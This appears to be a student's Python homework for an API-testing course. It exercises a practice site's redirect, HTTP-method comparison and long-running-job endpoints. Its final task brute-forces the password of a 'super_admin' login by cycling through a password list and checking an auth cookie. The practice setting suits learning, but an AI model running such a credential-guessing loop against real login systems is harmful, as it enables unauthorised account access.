import time
import requests


print("##### TASK 2 #####")

response = requests.get('https://playground.learnqa.ru/api/long_redirect')

print(f"Number of redirections: {len(response.history)}")
print('Redirects:')
for redirect in response.history:
    print(f"\t{redirect.url}")

print(f"Final URL: {response.url}")


print("##### TASK 3 #####")

method = 'https://playground.learnqa.ru/ajax/api/compare_query_type'
all_methods = ['GET', 'POST', 'PUT', 'DELETE']

print("### 3.1 ###")
response = requests.get(method)
print(f"Result of request without parameter: {response.text}")

print("### 3.2 ###")
response = requests.patch(method)
print(f"Result of request with unexpected method: {response.text}")

print("### 3.3 ###")
response = requests.post(method, data={'method': 'POST'})
print(f"Result of request with attached correct method: {response.text}")

print("### 3.4 ###")
false_success = 'No such combination'
false_fail = 'No such combination'
for method_call in all_methods:
    command = getattr(requests, method_call.lower())
    for mthd in all_methods:
        response = command(method, data={'method': mthd}) \
            if method_call != 'GET' \
            else command(method, params={'method': mthd})
        false_success = f'Request with method {method_call.lower()} and attached method {mthd}' \
            if 'success' in response.text and method_call != mthd \
            else false_success
        false_fail = f'Request with method {method_call.lower()} and attached method {mthd}' \
            if 'success' not in response.text and method_call == mthd \
            else false_fail
        print(f"Result of request with method {method_call.lower()} and attached method {mthd}: {response.text}")

print(f'\nFalse success in: {false_success}')
print(f'False fail in: {false_fail}')


print("##### TASK 4 #####")

method_link = 'https://playground.learnqa.ru/ajax/api/longtime_job'

print('### 4.1 Create task. Get token ###')
response = requests.get(method_link)
token = response.json()['token']
sleep_time = response.json()['seconds']
print(f"Token: {token}")
print('### 4.2 Check task status using token ###')
response = requests.get(method_link, params={'token': token})
print(f"Task status: {response.json()['status']}")
print(f'### 4.3 Waiting {sleep_time} seconds ###')
time.sleep(sleep_time)
print('### 4.4 Check task status and result ###')
response = requests.get(method_link, params={'token': token})
print(f'Status: {response.json()['status']}')
print(f'Result: {response.json()['result']}')


print("##### TASK 5 #####")
from temp import passwords

auth_method_link = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_auth_metod_link = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

print('### 5.1  Broot forcing password ###')

login = 'super_admin'

right_pass = []

for pswd in passwords:
    response = requests.post(auth_method_link, data={'login': login, 'password': pswd})
    cookie = response.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie} if cookie else {}
    response = requests.post(check_auth_metod_link, cookies=cookies)
    if response.text == 'You are authorized':
        right_pass.append(pswd)

print(f"Right combination: login - '{login}', password - '{right_pass[0] if len(right_pass) == 1 else right_pass}'")
